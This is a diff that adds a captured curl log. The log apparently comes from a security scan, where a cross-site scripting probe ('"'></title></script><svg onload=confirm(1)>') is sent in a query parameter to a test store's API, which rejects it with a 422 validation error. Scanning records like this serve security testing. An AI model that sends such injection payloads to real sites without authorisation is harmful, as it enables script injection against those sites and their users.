@@ -1,0 +1,7 @@
+# command: timeout 20 curl -s -m 18 -o - -w '\nHTTP_STATUS:%{http_code}\nCTYPE:%{content_type}' 'https://duck-store.escape.tech/api/v1/reviews/product/1?skip=s5x0642c569%22%27%3E%3C%2Ftitle%3E%3C%2Fscript%3E%3Csvg+onload%3Dconfirm%281%29%3E'
+# exit_code: 0
+# ---
+
+{"detail":[{"type":"int_parsing","loc":["query","skip"],"msg":"Input should be a valid integer, unable to parse string as an integer","input":"s5x0642c569\"'></title></script><svg onload=confirm(1)>"}]}
+HTTP_STATUS:422
+CTYPE:application/json
